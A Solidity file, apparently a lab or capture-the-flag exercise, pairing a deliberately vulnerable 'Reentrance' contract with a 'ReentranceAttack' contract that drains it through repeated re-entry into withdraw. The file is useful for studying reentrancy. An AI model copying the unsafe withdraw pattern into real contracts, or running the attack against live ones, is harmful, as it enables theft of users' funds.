// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
import "../lib/SaveMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract ReentranceAttack {
    Reentrance rtn;

    constructor(Reentrance _rtn) public {
        rtn = _rtn;
    }

    receive() external payable {
        if (address(rtn).balance >= 1 ether) {
            rtn.withdraw(1 ether);
        }
    }

    function attack() public payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        rtn.donate{value: msg.value}(address(this));
        rtn.withdraw(msg.value);
    }
}
